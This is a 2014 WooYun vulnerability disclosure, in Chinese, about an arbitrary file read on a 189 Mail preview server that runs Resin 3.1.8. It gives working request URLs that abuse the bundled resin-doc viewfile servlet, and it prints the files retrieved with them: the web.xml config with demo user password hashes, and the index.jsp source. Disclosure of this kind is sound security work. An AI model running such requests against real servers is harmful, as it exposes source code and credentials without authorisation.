wybug_title: 189邮箱某分站任意文件读取漏洞
wybug_detail:
漏洞详情 披露状态： 2014-08-21： 细节已通知厂商并且等待厂商处理中 2014-08-22： 厂商已经确认，细节仅向厂商公开 2014-09-01： 细节向核心白帽子及相关领域专家公开 2014-09-11： 细节向普通白帽子公开 2014-09-21： 细节向实习白帽子公开 2014-10-05： 细节向公众公开 简要描述： 189邮箱某分站存在任意文件读取漏洞，可以获取任意文件的源代码 详细说明： 漏洞网址：http://preview.mail.189.cn:8081/看了一下是Resin/3.1.8的系统默认情况下，Resin的/webapps目录下/resin-doc中包含有一个扩展war文件。该文档包含有用于在集成的手册中浏览文件的servlet，可以无需参数在Web主目录中浏览任意文件测试一个攻击url http://preview.mail.189.cn:8081/resin-doc/examples/security-basic/viewfile?file=WEB-INF/web.xml 攻击成功获取到WEB-INF/web.xml的文件内容 文件可以被分析敏感信息 WEB-INF/web.xml login-xml index.jsp index.html Home /home.jsp * Professors /professors/* professor Students /students/* student professor Staff /staff/* staff professor form /login.jsp /login.jsp?login_error=1 com.caucho.server.security.XmlAuthenticator pince:Txpd1jQc/xwhISIqodEjfw==:staff,website filch:KmZIq2RKXAHV4BaoNHfupQ==:staff WEB-INF/password.xml professor student staff member of the slytherin house slytherin member of the gryffindor house gryffindor member of the ravenclaw house ravenclaw member of the hufflepuff house hufflepuff website administrator website 再测试index.jsp的源码 http://preview.mail.189.cn:8081/resin-doc/examples/security-basic/viewfile?file=index.jsp 成功获取到： index.jsp<%@ taglib prefix='c' uri='http://java.sun.com/jsp/jstl/core' %><%@ include file="/inc/nobrowsercache.jspf" %><%-- /index.jsp - default page for website. --%> Hogwart's <%@ include file="/inc/buttonbar.jspf" %>

Welcome to Hogwart's!

This is a Defense Against the Dark Arts example of using JSP/Servlet security. Tutorial documentation is available.

Try doing a login logout

To get a better understanding of how security works, try using the following links both when you are logged in and when you are not.

All of the links are in secure areas. If you are not logged in a login procedure is put in by Resin before you get to the pages. If you are logged in, you may be able to see them or you may get a 'Forbidden' error.

Links to different areas:

  • Students (available to 'students' and 'professors')
  • Professors (available to 'professors')
  • Staff (available to 'staff' and 'professors')
In a real application, you wouldn't show links like this -- you would get the user to login first and then only display the links that are available for their role. <%@ include file="/inc/footer.jspf" %> 如果获取的文件不存在，则暴露路径 漏洞证明： 修复方案： 你懂的 版权声明：转载请注明来源 爱Gail@乌云
